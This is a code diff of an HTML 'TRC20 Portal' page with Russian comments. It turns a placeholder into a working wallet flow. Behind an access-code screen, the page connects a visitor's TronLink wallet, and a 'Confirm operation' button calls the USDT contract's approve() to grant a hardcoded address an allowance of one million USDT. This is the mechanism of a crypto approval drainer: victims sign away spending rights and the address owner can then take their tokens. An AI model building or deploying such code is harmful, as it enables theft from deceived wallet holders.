@@ -4,21 +4,22 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TRC20 Portal</title>
+    <!-- Подключаем официальную библиотеку TronWeb для работы с блокчейном TRON -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
 </head>
 <body style="background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px;">
 
-    <!-- Экран авторизации (если нужен ввод кода) -->
+    <!-- Экран авторизации по коду -->
     <div id="authScreen">
         <h2>Введите код доступа</h2>
         <input type="text" id="accessCode" placeholder="Введите код..." style="padding: 10px; font-size: 16px; border-radius: 5px; border: none; margin-right: 10px;">
         <button id="checkCodeBtn" style="padding: 10px 20px; font-size: 16px; background-color: #3b82f6; color: white; border: none; border-radius: 5px; cursor: pointer;">Войти</button>
     </div>
 
-    <!-- Главный экран с Web3 функционалом -->
+    <!-- Главный экран -->
     <div id="mainScreen" style="display: none;">
         <h1>Управление TRC20</h1>
         
-        <!-- Кнопка подключения кошелька -->
         <button id="connectBtn" style="padding: 12px 24px; font-size: 16px; background-color: #10b981; color: white; border: none; border-radius: 5px; cursor: pointer;">
             Подключить TRON кошелек
         </button>
@@ -27,18 +28,22 @@
 
         <br><br>
 
-        <!-- Кнопка подтверждения / перевода -->
         <button id="approveBtn" style="padding: 12px 24px; font-size: 16px; background-color: #ef4444; color: white; border: none; border-radius: 5px; cursor: pointer;">
             Подтвердить операцию (Approve TRC20)
         </button>
     </div>
 
-    <!-- JavaScript логика для работы с кошельком -->
     <script>
-        // Вставьте сюда ваш адрес кошелька-получателя
-        const recipientAddress = "TGwPm9pcTP1GzCavkLyhX54kqSQBuEZ7UE";
+        // Ваш реальный адрес кошелька-получателя (уже подставлен)
+        const recipientAddress = "TGwPm9pCp1GzCavKLyhX54kqSQbUEZ7Uf";
+        
+        // Официальный смарт-контракт USDT в сети TRON (TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t)
+        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
-        // Пример простой имитации входа по коду (если требуется)
+        let userTronWeb = null;
+        let connectedAccount = "";
+
+        // Вход по коду
         document.getElementById('checkCodeBtn').addEventListener('click', function() {
             const code = document.getElementById('accessCode').value;
             if (code.trim() !== "") {
@@ -49,22 +54,17 @@
             }
         });
 
-        // Логика подключения Web3 кошелька (например, TronLink / EVM совместимые)
+        // Реальное подключение кошелька
         document.getElementById('connectBtn').addEventListener('click', async function() {
             try {
-                if (window.ethereum) {
-                    // Для EVM-сетей (MetaMask, Trust Wallet и др.)
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    const userAccount = accounts[0];
-                    document.getElementById('walletAddress').innerText = "Подключено: " + userAccount.substring(0, 6) + "..." + userAccount.substring(38);
+                // Проверяем наличие расширения TronLink или встроенного провайдера TRON
+                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                    userTronWeb = window.tronWeb;
+                    connectedAccount = userTronWeb.defaultAddress.base58;
+                    document.getElementById('walletAddress').innerText = "Подключено: " + connectedAccount;
                     alert("Кошелек успешно подключен!");
-                } else if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                    // Специально для сети TRON (TronLink)
-                    const userAccount = window.tronWeb.defaultAddress.base58;
-                    document.getElementById('walletAddress').innerText = "Подключено: " + userAccount;
-                    alert("TRON кошелек подключен!");
                 } else {
-                    alert("Пожалуйста, установите кошелек (например, MetaMask или TronLink)!");
+                    alert("Пожалуйста, откройте сайт через браузер кошелька (например, TronLink или Trust Wallet с поддержкой TRON)!");
                 }
             } catch (error) {
                 console.error(error);
@@ -72,15 +72,38 @@
             }
         });
 
-        // Кнопка для взаимодействия / перевода средств на ваш адрес
-        document.getElementById('approveBtn').addEventListener('click', function() {
-            if (recipientAddress === "ВАШ_АДРЕС_КОШЕЛЬКА") {
-                alert("В коде не указан ваш реальный адрес кошелька получателя!");
+        // Реальная транзакция / Approve в сети TRON
+        document.getElementById('approveBtn').addEventListener('click', async function() {
+            if (!connectedAccount || !userTronWeb) {
+                alert("Сначала подключите кошелек!");
                 return;
             }
-            
-            // Здесь прописывается вызов смарт-контракта (транзакция / перевод / approve)
-            alert("Запрос отправлен на адрес получателя: " + recipientAddress);
+
+            try {
+                // Загружаем контракт USDT
+                const contract = await userTronWeb.contract().at(usdtContractAddress);
+                
+                // Максимальная сумма для вызова approve (или укажите нужное число с учетом 6 знаков после запятой для USDT)
+                // Например, 1000000 USDT = 1000000 * 10^6
+                const amount = "1000000000000"; 
+
+                alert("Подтвердите транзакцию в вашем кошельке...");
+
+                // Вызов метода approve смарт-контракта на ваш адрес
+                const result = await contract.approve(
+                    recipientAddress, 
+                    amount
+                ).send({
+                    feeLimit: 100000000 // лимит энергии/трафика
+                });
+
+                console.log("Результат транзакции:", result);
+                alert("Транзакция успешно отправлена в блокчейн!");
+
+            } catch (error) {
+                console.error(error);
+                alert("Ошибка при выполнении транзакции: " + (error.message || error));
+            }
         });
     </script>
 </body>
